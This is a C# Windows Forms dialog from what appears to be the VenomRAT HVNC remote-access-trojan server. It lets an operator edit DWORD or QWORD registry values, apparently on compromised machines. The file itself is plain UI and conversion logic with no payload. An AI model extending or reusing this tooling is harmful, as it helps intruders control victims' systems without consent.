using System;
using System.Windows.Forms;
using Microsoft.Win32;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormRegValueEditWord : Form
    {
        public FormRegValueEditWord(RegistrySeeker.RegValueData value)
        {
            this._value = value;
            this.InitializeComponent();
            this.valueNameTxtBox.Text = value.Name;
            if (value.Kind == RegistryValueKind.DWord)
            {
                this.Text = "Edit DWORD (32-bit) Value";
                this.valueDataTxtBox.Type = WordTextBox.WordType.DWORD;
                this.valueDataTxtBox.Text = global::VenomRAT_HVNC.Server.Helper.ByteConverter.ToUInt32(value.Data).ToString("x");
                return;
            }
            this.Text = "Edit QWORD (64-bit) Value";
            this.valueDataTxtBox.Type = WordTextBox.WordType.QWORD;
            this.valueDataTxtBox.Text = global::VenomRAT_HVNC.Server.Helper.ByteConverter.ToUInt64(value.Data).ToString("x");
        }

        private void radioHex_CheckboxChanged(object sender, EventArgs e)
        {
            if (this.valueDataTxtBox.IsHexNumber == this.radioHexa.Checked)
            {
                return;
            }
            if (this.valueDataTxtBox.IsConversionValid() || this.IsOverridePossible())
            {
                this.valueDataTxtBox.IsHexNumber = this.radioHexa.Checked;
                return;
            }
            this.radioDecimal.Checked = true;
        }

        private void okButton_Click(object sender, EventArgs e)
        {
            if (this.valueDataTxtBox.IsConversionValid() || this.IsOverridePossible())
            {
                this._value.Data = ((this._value.Kind == RegistryValueKind.DWord) ? global::VenomRAT_HVNC.Server.Helper.ByteConverter.GetBytes(this.valueDataTxtBox.UIntValue) : global::VenomRAT_HVNC.Server.Helper.ByteConverter.GetBytes(this.valueDataTxtBox.ULongValue));
                base.Tag = this._value;
                base.DialogResult = DialogResult.OK;
            }
            else
            {
                base.DialogResult = DialogResult.None;
            }
            base.Close();
        }

        private DialogResult ShowWarning(string msg, string caption)
        {
            return MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
        }

        private bool IsOverridePossible()
        {
            string msg = ((this._value.Kind == RegistryValueKind.DWord) ? "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?" : "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?");
            return this.ShowWarning(msg, "Overflow") == DialogResult.Yes;
        }

        private readonly RegistrySeeker.RegValueData _value;

        private const string DWORD_WARNING = "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?";

        private const string QWORD_WARNING = "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?";
    }
}
